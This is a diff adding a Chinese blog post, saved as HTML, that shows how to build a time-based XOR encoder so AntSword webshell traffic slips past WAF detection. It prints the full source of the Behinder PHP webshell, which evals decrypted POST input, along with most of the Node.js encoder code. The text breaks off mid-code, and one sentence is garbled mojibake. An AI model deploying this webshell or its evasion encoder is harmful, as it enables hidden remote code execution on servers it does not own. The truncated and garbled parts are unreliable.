@@ -1,0 +1,975 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>蚁剑实现动态秘钥编码器解码器 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="蚁剑实现动态秘钥编码器解码器" />
+<meta property="og:description" content="1 前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用 但是这个模块大多数情况下是不开的，所以就导" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-15T09:43:37+00:00" />
+<meta property="article:modified_time" content="2019-10-15T09:43:37+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="蚁剑实现动态秘钥编码器解码器"/>
+<meta name="twitter:description" content="1 前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用 但是这个模块大多数情况下是不开的，所以就导"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/antsword-xor-encoder/" /><link rel="prev" href="https://yzddmr6.com/posts/webshell-bypass-php/" /><link rel="next" href="https://yzddmr6.com/posts/pluck-cms-getshell/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "蚁剑实现动态秘钥编码器解码器",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/"
+        },"genre": "posts","keywords": "免杀, 中国蚁剑","wordcount":  2541 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/antsword-xor-encoder\/","datePublished": "2019-10-15T09:43:37+00:00","dateModified": "2019-10-15T09:43:37+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#冰蝎的解决方案">冰蝎的解决方案</a></li>
+    <li><a href="#如何生成随机秘钥">如何生成随机秘钥</a>
+      <ul>
+        <li><a href="#如何规避特征">如何规避特征</a></li>
+        <li><a href="#时间格式的选择">时间格式的选择</a></li>
+      </ul>
+    </li>
+    <li><a href="#思路与实现">思路与实现</a>
+      <ul>
+        <li><a href="#动态秘钥编码器">动态秘钥编码器</a></li>
+        <li><a href="#动态秘钥解码器">动态秘钥解码器</a></li>
+        <li><a href="#服务端">服务端</a></li>
+      </ul>
+    </li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#最后">最后</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">蚁剑实现动态秘钥编码器解码器</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-15">2019-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2541 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#冰蝎的解决方案">冰蝎的解决方案</a></li>
+    <li><a href="#如何生成随机秘钥">如何生成随机秘钥</a>
+      <ul>
+        <li><a href="#如何规避特征">如何规避特征</a></li>
+        <li><a href="#时间格式的选择">时间格式的选择</a></li>
+      </ul>
+    </li>
+    <li><a href="#思路与实现">思路与实现</a>
+      <ul>
+        <li><a href="#动态秘钥编码器">动态秘钥编码器</a></li>
+        <li><a href="#动态秘钥解码器">动态秘钥解码器</a></li>
+        <li><a href="#服务端">服务端</a></li>
+      </ul>
+    </li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#最后">最后</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启<code>openssl</code>扩展才可以使用</p>
+<p>但是这个模块大多数情况下是不开的，所以就导致蚁剑的强加密类型的编码器、解码器无法使用</p>
+<p>于是借鉴了一下冰蝎的思路，实现了一个动态秘钥的编码器解码器。</p>
+<h2 id="冰蝎的解决方案" class="headerLink">
+    <a href="#%e5%86%b0%e8%9d%8e%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="header-mark"></a>2 冰蝎的解决方案</h2><p>我记得冰蝎在1.0版本有同样的问题，模块不开shell就用不了，但是2.0就解决了这个问题。</p>
+<p>那么冰蝎是怎么解决的呢。</p>
+<p>看一下他的shell.php是怎么写的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">@error_reporting(0);
+</span></span><span class="line"><span class="cl">session_start();
+</span></span><span class="line"><span class="cl">if (isset($_GET[&#39;pass&#39;]))
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $key=substr(md5(uniqid(rand())),16);
+</span></span><span class="line"><span class="cl">    $_SESSION[&#39;k&#39;]=$key;
+</span></span><span class="line"><span class="cl">    print $key;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">else
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $key=$_SESSION[&#39;k&#39;];
+</span></span><span class="line"><span class="cl">	$post=file_get_contents(&#34;php://input&#34;);
+</span></span><span class="line"><span class="cl">	if(!extension_loaded(&#39;openssl&#39;))
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		$t=&#34;base64_&#34;.&#34;decode&#34;;
+</span></span><span class="line"><span class="cl">		$post=$t($post.&#34;&#34;);
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		for($i=0;$i&lt;strlen($post);$i++) {
+</span></span><span class="line"><span class="cl">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
+</span></span><span class="line"><span class="cl">    			}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	else
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		$post=openssl_decrypt($post, &#34;AES128&#34;, $key);
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">    $arr=explode(&#39;|&#39;,$post);
+</span></span><span class="line"><span class="cl">    $func=$arr[0];
+</span></span><span class="line"><span class="cl">    $params=$arr[1];
+</span></span><span class="line"><span class="cl">	class C{public function __construct($p) {eval($p.&#34;&#34;);}}
+</span></span><span class="line"><span class="cl">	@new C($params);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意看这一段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(!extension_loaded(&#39;openssl&#39;))
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		$t=&#34;base64_&#34;.&#34;decode&#34;;
+</span></span><span class="line"><span class="cl">		$post=$t($post.&#34;&#34;);
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		for($i=0;$i&lt;strlen($post);$i++) {
+</span></span><span class="line"><span class="cl">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
+</span></span><span class="line"><span class="cl">    			}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	else  xxxxxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果没有<code>openssl</code>扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍</p>
+<p>相当于自己写了个加密函数。</p>
+<p>那么当然蚁剑也可以利用此思路来解决此问题。</p>
+<h2 id="如何生成随机秘钥" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e7%94%9f%e6%88%90%e9%9a%8f%e6%9c%ba%e7%a7%98%e9%92%a5" class="header-mark"></a>3 如何生成随机秘钥</h2><p>冰蝎的做法是先请求两次shell(因为第二次请求的时候才会将秘钥保存到session中)</p>
+<p>如果请求中有<code>pass=xxx</code>就返回一个十六位的随机秘钥</p>
+<p>然后客户端跟服务端分别记下这个秘钥，用于后面流量的加密解密。</p>
+<p>但是也带来一个问题，握手获得秘钥的过程已经成为了很多WAF检测的特征。</p>
+<p><a href="https:_www.freebuf.com_articles_web_213905" rel="">冰蝎动态二进制加密WebShell特征分析</a></p>
+<h3 id="如何规避特征" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e8%a7%84%e9%81%bf%e7%89%b9%e5%be%81" class="header-mark"></a>3.1 如何规避特征</h3><p>当然我们可以用<code>PHPSESSID</code>来作为秘钥，蚁剑的AES编码器也是这么做的。</p>
+<p>但是因为蚁剑的机制里面没有自动获取cookie这一个操作</p>
+<p>所以需要你人工浏览网站-&gt;获取cookie-&gt;填入配置文件才可以使用，但是太过麻烦。</p>
+<p>那么我们能否设置一个不需要握手，并且很容易就可以获得的随机秘钥呢</p>
+<p>于是想到可以我们可以用时间</p>
+<h3 id="时间格式的选择" class="headerLink">
+    <a href="#%e6%97%b6%e9%97%b4%e6%a0%bc%e5%bc%8f%e7%9a%84%e9%80%89%e6%8b%a9" class="header-mark"></a>3.2 时间格式的选择</h3><p>时间也有很多种格式，选择哪一种呢？</p>
+<p>想到如果时间中带有秒的话，很容易发个包过去就错过同一时间了，无法完成加解密。</p>
+<p>所以我们可以采用<code>年-月-日 时-分</code>的时间格式，然后md5一次，来作为我们的随机秘钥。</p>
+<h2 id="思路与实现" class="headerLink">
+    <a href="#%e6%80%9d%e8%b7%af%e4%b8%8e%e5%ae%9e%e7%8e%b0" class="header-mark"></a>4 思路与实现</h2><p>蚁剑获取时间-&gt;生成随机秘钥-&gt;加密payload-&gt;发送给shell</p>
+<p>shell获取时间-&gt;生成随机秘钥-&gt;解密payload-&gt;将回显data编码-&gt;返回给蚁剑</p>
+<p>蚁剑获取时间-&gt;生成随机秘钥-&gt;解密返回data-&gt;获取信息</p>
+<p>要注意的是因为基于时间产生秘钥，所以要保证你的时区是跟shell的时区是一致的。</p>
+<p>因为我本地蚁剑是北京时间，所以在shell中也强制设置为北京时间。</p>
+<h3 id="动态秘钥编码器" class="headerLink">
+    <a href="#%e5%8a%a8%e6%80%81%e7%a7%98%e9%92%a5%e7%bc%96%e7%a0%81%e5%99%a8" class="header-mark"></a>4.1 动态秘钥编码器</h3><p>不得不说一个坑</p>
+<p>同样一句<code>console.log(new Date().toLocaleString());</code></p>
+<p>在node中是24小时制</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>在浏览器跟蚁剑中是12小时制</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>被坑了好久没发现。。。</p>
+<p>干脆重新确定一个24小时制的规范时间格式，也方便后期自定义修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Object.assign(Date.prototype, {
+</span></span><span class="line"><span class="cl">        switch (time) {
+</span></span><span class="line"><span class="cl">            let date = {
+</span></span><span class="line"><span class="cl">                &#34;yy&#34;: this.getFullYear(),
+</span></span><span class="line"><span class="cl">                &#34;MM&#34;: this.getMonth() + 1,
+</span></span><span class="line"><span class="cl">                &#34;dd&#34;: this.getDate(),
+</span></span><span class="line"><span class="cl">                &#34;hh&#34;: this.getHours(),
+</span></span><span class="line"><span class="cl">                &#34;mm&#34;: this.getMinutes(),
+</span></span><span class="line"><span class="cl">                &#34;ss&#34;: this.getSeconds()
+</span></span><span class="line"><span class="cl">            };
+</span></span><span class="line"><span class="cl">            if (/(y+)/i.test(time)) {
+</span></span><span class="line"><span class="cl">                time = time.replace(RegExp.$1, (this.getFullYear() + &#39;&#39;).substr(4 - RegExp.$1.length));
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            Object.keys(date).forEach(function (i) {
+</span></span><span class="line"><span class="cl">                if (new RegExp(&#34;(&#34; + i + &#34;)&#34;).test(time)) {
+</span></span><span class="line"><span class="cl">                    if (RegExp.$1.length == 2) {
+</span></span><span class="line"><span class="cl">                        date[i] &lt; 10 ? date[i] = &#39;0&#39; + date[i] : date[i];
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    time = time.replace(RegExp.$1, date[i]);
+</span></span><span class="line"><span class="cl">                }
+</span></span><span class="line"><span class="cl">            })
+</span></span><span class="line"><span class="cl">            return time;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    })
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    let newDate = new Date();
+</span></span><span class="line"><span class="cl">    let time = newDate.switch(&#39;yyyy-MM-dd hh:mm&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以demo是这样的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
+</span></span><span class="line"><span class="cl">// code by yzddmr6
+</span></span><span class="line"><span class="cl">/*
+</span></span><span class="line"><span class="cl">* @param  {String} pwd   连接密码
+</span></span><span class="line"><span class="cl">* @param  {Array}  data  编码器处理前的 payload 数组
+</span></span><span class="line"><span class="cl">* @return {Array}  data  编码器处理后的 payload 数组
+</span></span><span class="line"><span class="cl">*/
+</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext={}) =&gt; {
+</span></span><span class="line"><span class="cl">  function xor(payload){
+</span></span><span class="line"><span class="cl">    let crypto = require(&#39;crypto&#39;);
+</span></span><span class="line"><span class="cl">    Object.assign(Date.prototype, {
+</span></span><span class="line"><span class="cl">        switch (time) {
+</span></span><span class="line"><span class="cl">            let date = {
+</span></span><span class="line"><span class="cl">                &#34;yy&#34;: this.getFullYear(),
+</span></span><span class="line"><span class="cl">                &#34;MM&#34;: this.getMonth() + 1,
+</span></span><span class="line"><span class="cl">                &#34;dd&#34;: this.getDate(),
+</span></span><span class="line"><span class="cl">                &#34;hh&#34;: this.getHours(),
+</span></span><span class="line"><span class="cl">                &#34;mm&#34;: this.getMinutes(),
+</span></span><span class="line"><span class="cl">                &#34;ss&#34;: this.getSeconds()
+</span></span><span class="line"><span class="cl">            };
+</span></span><span class="line"><span class="cl">            if (/(y+)/i.test(time)) {
+</span></span><span class="line"><span class="cl">                time = time.replace(RegExp.$1, (this.getFullYear() + &#39;&#39;).substr(4 - RegExp.$1.length));
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            Object.keys(date).forEach(function (i) {
+</span></span><span class="line"><span class="cl">                if (new RegExp(&#34;(&#34; + i + &#34;)&#34;).test(time)) {
+</span></span><span class="line"><span class="cl">                    if (RegExp.$1.length == 2) {
+</span></span><span class="line"><span class="cl">                        date[i] &lt; 10 ? date[i] = &#39;0&#39; + date[i] : date[i];
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    time = time.replace(RegExp.$1, date[i]);
+</span></span><span class="line"><span class="cl">                }
+</span></span><span class="line"><span class="cl">            })
+</span></span><span class="line"><span class="cl">            return time;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    })
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    let newDate = new Date();
+</span></span><span class="line"><span class="cl">    let time = newDate.switch(&#39;yyyy-MM-dd hh:mm&#39;);
+</span></span><span class="line"><span class="cl">    let key = crypto.createHash(&#39;md5&#39;).update(time).digest(&#39;hex&#39;)
+</span></span><span class="line"><span class="cl">    key=key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">    //let payload=&#34;phpinfo();&#34;;
+</span></span><span class="line"><span class="cl">    let cipher = payload.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
+</span></span><span class="line"><span class="cl">    for(let i=0;i&lt;cipher.length;i++){
+</span></span><span class="line"><span class="cl">        cipher[i]=cipher[i]^key[i%32]
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&#34;&#34;)
+</span></span><span class="line"><span class="cl">    cipher=Buffer.from(cipher).toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">    //console.log(cipher)
